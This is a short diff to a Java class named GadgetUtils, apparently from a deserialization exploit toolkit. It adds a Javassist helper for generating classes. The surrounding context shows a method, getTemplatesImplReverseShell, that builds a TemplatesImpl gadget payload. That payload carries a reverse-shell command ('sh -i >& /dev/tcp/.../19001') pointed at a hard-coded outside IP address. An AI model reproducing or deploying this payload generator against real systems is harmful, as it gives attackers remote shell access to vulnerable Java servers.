@@ -49,6 +49,14 @@ public class GadgetUtils {
         return templates;
     }
 
+    public static Class makeClass(String clazzName) throws Exception{
+        ClassPool classPool = ClassPool.getDefault();
+        CtClass ctClass = classPool.makeClass(clazzName);
+        Class clazz = ctClass.toClass();
+        ctClass.defrost();
+        return clazz;
+    }
+
     //whoami
     public static TemplatesImpl getTemplatesImplReverseShell() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
         String cmd = "new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/159.226.94.139/19001 0>&1\"}";
